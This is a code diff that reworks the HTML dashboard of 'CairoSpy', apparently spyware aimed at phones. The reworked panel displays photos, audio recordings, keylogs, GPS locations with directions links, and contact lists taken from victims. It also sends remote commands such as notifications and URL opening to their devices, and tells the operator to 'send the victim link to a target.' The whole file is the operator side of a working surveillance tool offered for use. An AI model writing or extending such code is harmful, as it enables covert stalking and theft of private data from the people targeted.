@@ -5,108 +5,229 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CairoSpy - Dashboard</title>
     <style>
-        body { font-family: Arial; background: #0a0a1a; color: #fff; padding: 20px; }
-        h1 { color: #00d4ff; }
-        .card { background: #1a1a2e; border-radius: 12px; padding: 20px; margin: 20px 0; }
-        .btn { background: #00d4ff; color: #000; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; margin: 5px; }
-        pre { background: #111; padding: 10px; border-radius: 8px; overflow-x: auto; }
-        .file-list { max-height: 300px; overflow-y: auto; }
-        .file-list a { color: #7b2ff7; display: block; padding: 5px; }
-        input, textarea { width: 100%; padding: 10px; margin: 5px 0; border-radius: 8px; border: 1px solid #333; background: #111; color: #fff; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background: #0a0e1a; color: #e0e0e0; }
+        .header { background: linear-gradient(135deg, #1a1f3a, #0d1321); padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00d4ff; }
+        .header h1 { color: #00d4ff; font-size: 24px; }
+        .header .badge { background: #00d4ff; color: #000; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; padding: 20px 30px; }
+        .stat-card { background: #141a2e; border-radius: 10px; padding: 20px; text-align: center; border: 1px solid #2a3050; }
+        .stat-card .number { font-size: 36px; font-weight: bold; color: #00d4ff; }
+        .stat-card .label { font-size: 12px; color: #888; margin-top: 5px; text-transform: uppercase; }
+        .controls { padding: 20px 30px; }
+        .controls h2 { color: #00d4ff; margin-bottom: 15px; font-size: 18px; }
+        .controls-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; }
+        .ctrl-btn { background: #141a2e; border: 1px solid #2a3050; color: #e0e0e0; padding: 15px; border-radius: 8px; cursor: pointer; transition: all 0.3s; text-align: center; }
+        .ctrl-btn:hover { background: #1e2640; border-color: #00d4ff; transform: translateY(-2px); }
+        .ctrl-btn .icon { font-size: 24px; display: block; margin-bottom: 5px; }
+        .ctrl-btn .name { font-size: 13px; }
+        .ctrl-btn input { width: 100%; padding: 8px; margin-top: 8px; background: #0a0e1a; border: 1px solid #2a3050; border-radius: 5px; color: #fff; }
+        .data-section { padding: 0 30px 30px; }
+        .data-section h2 { color: #00d4ff; margin-bottom: 15px; font-size: 18px; }
+        .tabs { display: flex; gap: 5px; margin-bottom: 15px; flex-wrap: wrap; }
+        .tab { background: #141a2e; border: 1px solid #2a3050; color: #888; padding: 8px 20px; border-radius: 5px; cursor: pointer; font-size: 13px; }
+        .tab.active { background: #00d4ff; color: #000; border-color: #00d4ff; font-weight: bold; }
+        .tab-content { background: #141a2e; border-radius: 10px; padding: 20px; min-height: 200px; border: 1px solid #2a3050; }
+        .entry { border-bottom: 1px solid #2a3050; padding: 10px 0; }
+        .entry:last-child { border-bottom: none; }
+        .entry .time { color: #00d4ff; font-size: 11px; }
+        .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
+        .photo-grid img { width: 100%; border-radius: 5px; border: 1px solid #2a3050; }
+        .location-link { color: #00d4ff; text-decoration: none; }
+        .location-link:hover { text-decoration: underline; }
+        pre { background: #0a0e1a; padding: 10px; border-radius: 5px; overflow-x: auto; font-size: 12px; color: #0f0; }
+        .refresh-btn { background: #00d4ff; color: #000; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; float: right; }
+        .refresh-btn:hover { background: #00b8e6; }
     </style>
 </head>
 <body>
-    <h1>🕵️ CairoSpy Dashboard</h1>
-    <p>Victim IP: {{ victim_ip }}</p>
+    <div class="header">
+        <h1>🐍 CairoSpy Dashboard</h1>
+        <span class="badge">LIVE</span>
+    </div>
 
-    <div class="card">
+    <div class="stats" id="stats">
+        <div class="stat-card"><div class="number" id="photo-count">0</div><div class="label">📷 Photos</div></div>
+        <div class="stat-card"><div class="number" id="audio-count">0</div><div class="label">🎤 Audio</div></div>
+        <div class="stat-card"><div class="number" id="keylog-count">0</div><div class="label">⌨️ Keylogs</div></div>
+        <div class="stat-card"><div class="number" id="location-count">0</div><div class="label">📍 Locations</div></div>
+        <div class="stat-card"><div class="number" id="contact-count">0</div><div class="label">📞 Contacts</div></div>
+    </div>
+
+    <div class="controls">
         <h2>🎮 Control Panel</h2>
-        <input type="text" id="toastMsg" placeholder="Toast message">
-        <button class="btn" onclick="sendControl('toast')">Send Toast</button>
-        
-        <input type="text" id="notifyTitle" placeholder="Notification title">
-        <input type="text" id="notifyBody" placeholder="Notification body">
-        <button class="btn" onclick="sendControl('notify')">Send Notification</button>
-        
-        <button class="btn" onclick="sendControl('sound')">🔊 Play Sound</button>
-        <button class="btn" onclick="sendControl('vibrate')">📳 Vibrate</button>
-        
-        <input type="url" id="openUrl" placeholder="https://example.com">
-        <button class="btn" onclick="sendControl('open_url')">Open URL</button>
+        <div class="controls-grid" id="control-buttons"></div>
     </div>
 
-    <div class="card">
-        <h2>📸 Camera</h2>
-        <div class="file-list">
-            {% for file in files.camera %}
-            <a href="/stolen/camera/{{ file }}" target="_blank">{{ file }}</a>
-            {% else %}
-            <p>No images captured yet</p>
-            {% endfor %}
-        </div>
-    </div>
-
-    <div class="card">
-        <h2>⌨️ Keylogs</h2>
-        <div class="file-list">
-            {% for file in files.keys %}
-            <a href="/stolen/keys/{{ file }}" target="_blank">{{ file }}</a>
-            {% else %}
-            <p>No keylogs yet</p>
-            {% endfor %}
-        </div>
-    </div>
-
-    <div class="card">
-        <h2>📍 Locations</h2>
-        <div class="file-list">
-            {% for file in files.location %}
-            <a href="/stolen/location/{{ file }}" target="_blank">{{ file }}</a>
-            {% else %}
-            <p>No locations yet</p>
-            {% endfor %}
-        </div>
-    </div>
-
-    <div class="card">
-        <h2>👤 Contacts</h2>
-        <div class="file-list">
-            {% for file in files.contacts %}
-            <a href="/stolen/contacts/{{ file }}" target="_blank">{{ file }}</a>
-            {% else %}
-            <p>No contacts yet</p>
-            {% endfor %}
-        </div>
-    </div>
-
-    <div class="card">
-        <h2>📁 Files (Audio, etc.)</h2>
-        <div class="file-list">
-            {% for file in files.files %}
-            <a href="/stolen/files/{{ file }}" target="_blank">{{ file }}</a>
-            {% else %}
-            <p>No files yet</p>
-            {% endfor %}
+    <div class="data-section">
+        <h2>📁 Stolen Data <button class="refresh-btn" onclick="refreshData()">🔄 Refresh</button></h2>
+        <div class="tabs" id="tabs"></div>
+        <div class="tab-content" id="tab-content">
+            <p style="color:#888; text-align:center; padding:40px;">Waiting for data... Send the victim link to a target.</p>
         </div>
     </div>
 
     <script>
-        function sendControl(action) {
-            const data = { action: action };
-            if (action === 'toast') data.message = document.getElementById('toastMsg').value || 'Hello from CairoSpy';
-            if (action === 'notify') {
-                data.title = document.getElementById('notifyTitle').value || 'Alert';
-                data.body = document.getElementById('notifyBody').value || 'You have been notified';
-            }
-            if (action === 'vibrate') data.duration = 5000;
-            if (action === 'open_url') data.url = document.getElementById('openUrl').value || 'https://example.com';
-            
-            fetch('/api/control', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(r => r.json()).then(d => console.log(d));
+        // ===== تعريفات أوامر التحكم =====
+        const COMMANDS = [
+            { type: 'toast', icon: '💬', name: 'Toast Message', params: [{key: 'message', placeholder: 'Enter toast text...'}] },
+            { type: 'notification', icon: '🔔', name: 'Notification', params: [{key: 'title', placeholder: 'Title'}, {key: 'body', placeholder: 'Body text'}] },
+            { type: 'vibrate', icon: '📳', name: 'Vibrate', params: [{key: 'duration', placeholder: 'Duration (ms)', value: '1000'}] },
+            { type: 'sound', icon: '🔊', name: 'Play Sound', params: [{key: 'url', placeholder: 'Sound URL (optional)'}] },
+            { type: 'open_url', icon: '🔗', name: 'Open URL', params: [{key: 'url', placeholder: 'https://example.com'}] },
+        ];
+
+        const CATEGORIES = ['photos', 'audio', 'keylogs', 'locations', 'contacts', 'files'];
+
+        // ===== توليد أزرار التحكم =====
+        function buildControls() {
+            const container = document.getElementById('control-buttons');
+            COMMANDS.forEach(cmd => {
+                const div = document.createElement('div');
+                div.className = 'ctrl-btn';
+                let html = `<span class="icon">${cmd.icon}</span><span class="name">${cmd.name}</span>`;
+                if (cmd.params) {
+                    cmd.params.forEach(p => {
+                        html += `<input type="text" class="param-${cmd.type}" data-key="${p.key}" placeholder="${p.placeholder}" value="${p.value || ''}">`;
+                    });
+                }
+                div.innerHTML = html;
+                div.onclick = () => sendCommand(cmd);
+                container.appendChild(div);
+            });
         }
+
+        // ===== توليد التبويبات =====
+        function buildTabs() {
+            const tabsContainer = document.getElementById('tabs');
+            CATEGORIES.forEach((cat, idx) => {
+                const tab = document.createElement('div');
+                tab.className = 'tab' + (idx === 0 ? ' active' : '');
+                tab.textContent = cat.charAt(0).toUpperCase() + cat.slice(1);
+                tab.onclick = () => switchTab(cat, tab);
+                tabsContainer.appendChild(tab);
+            });
+        }
+
+        let currentTab = 'photos';
+
+        function switchTab(category, tabEl) {
+            currentTab = category;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            tabEl.classList.add('active');
+            renderCategory(category);
+        }
+
+        // ===== عرض البيانات حسب التبويب =====
+        function renderCategory(category) {
+            const content = document.getElementById('tab-content');
+            const data = window.allData?.[category] || [];
+            
+            if (data.length === 0) {
+                content.innerHTML = '<p style="color:#888; text-align:center; padding:40px;">No data yet in this category.</p>';
+                return;
+            }
+
+            let html = '';
+            if (category === 'photos') {
+                html = '<div class="photo-grid">';
+                data.slice().reverse().forEach(item => {
+                    const img = item.full_image || item.content;
+                    if (img && img.length > 100) {
+                        html += `<img src="data:image/jpeg;base64,${img}" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22200%22 height=%22200%22><rect fill=%22%23333%22 width=%22200%22 height=%22200%22/><text fill=%22%23888%22 x=%2250%22 y=%22110%22>Image</text></svg>'"/>`;
+                    }
+                });
+                html += '</div>';
+            } else if (category === 'locations') {
+                data.slice().reverse().forEach((item, i) => {
+                    const lat = item.lat, lng = item.lng;
+                    html += `<div class="entry">#${i+1} | ${item.timestamp || 'N/A'}<br>`;
+                    if (lat && lng) {
+                        html += `<a class="location-link" href="https://www.google.com/maps?q=${lat},${lng}" target="_blank">📍 ${lat}, ${lng}</a>`;
+                        html += ` <a class="location-link" href="https://www.google.com/maps/dir//${lat},${lng}/@${lat},${lng},15z" target="_blank">[Directions]</a>`;
+                    }
+                    html += '</div>';
+                });
+            } else if (category === 'keylogs') {
+                data.slice().reverse().forEach((item, i) => {
+                    html += `<div class="entry"><span class="time">#${i+1} | ${item.timestamp || ''}</span><pre>${item.keys || item.content || ''}</pre></div>`;
+                });
+            } else if (category === 'contacts') {
+                data.slice().reverse().forEach((item, i) => {
+                    const contacts = item.contacts || [];
+                    html += `<div class="entry"><span class="time">#${i+1} | ${item.timestamp || ''} (${contacts.length} contacts)</span><br>`;
+                    contacts.forEach(c => {
+                        html += `- ${c.name || 'N/A'}: ${c.phone || c.number || 'N/A'}<br>`;
+                    });
+                    html += '</div>';
+                });
+            } else if (category === 'audio') {
+                data.slice().reverse().forEach((item, i) => {
+                    const audio = item.full_audio || item.content;
+                    html += `<div class="entry"><span class="time">#${i+1} | ${item.timestamp || ''} | Duration: ${item.duration || 'N/A'}</span><br>`;
+                    if (audio && audio.length > 100) {
+                        html += `<audio controls style="width:100%;margin-top:5px;"><source src="data:audio/wav;base64,${audio}" type="audio/wav"></audio>`;
+                    }
+                    html += '</div>';
+                });
+            } else {
+                data.slice().reverse().forEach((item, i) => {
+                    html += `<div class="entry"><span class="time">#${i+1} | ${item.timestamp || ''}</span><pre>${JSON.stringify(item.content || item, null, 2)}</pre></div>`;
+                });
+            }
+            content.innerHTML = html;
+        }
+
+        // ===== إرسال الأمر =====
+        async function sendCommand(cmd) {
+            const params = {};
+            if (cmd.params) {
+                cmd.params.forEach(p => {
+                    const input = document.querySelector(`.param-${cmd.type}[data-key="${p.key}"]`);
+                    params[p.key] = input ? input.value : (p.value || '');
+                });
+            }
+            try {
+                const res = await fetch('/api/command/send', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({type: cmd.type, params: params})
+                });
+                const data = await res.json();
+                alert(`✅ Command sent: ${cmd.name}\nID: ${data.command_id}`);
+            } catch(e) {
+                alert(`❌ Error: ${e.message}`);
+            }
+        }
+
+        // ===== تحديث البيانات =====
+        async function refreshData() {
+            try {
+                const res = await fetch('/api/dashboard/data');
+                const data = await res.json();
+                window.allData = data;
+                
+                // تحديث الإحصائيات
+                document.getElementById('photo-count').textContent = (data.photos || []).length;
+                document.getElementById('audio-count').textContent = (data.audio || []).length;
+                document.getElementById('keylog-count').textContent = (data.keylogs || []).length;
+                document.getElementById('location-count').textContent = (data.locations || []).length;
+                document.getElementById('contact-count').textContent = (data.contacts || []).length;
+                
+                // تحديث التبويب الحالي
+                renderCategory(currentTab);
+            } catch(e) {
+                console.error('Refresh error:', e);
+            }
+        }
+
+        // ===== تشغيل =====
+        buildControls();
+        buildTabs();
+        
+        // Auto-refresh كل 5 ثواني
+        refreshData();
+        setInterval(refreshData, 5000);
     </script>
 </body>
 </html>
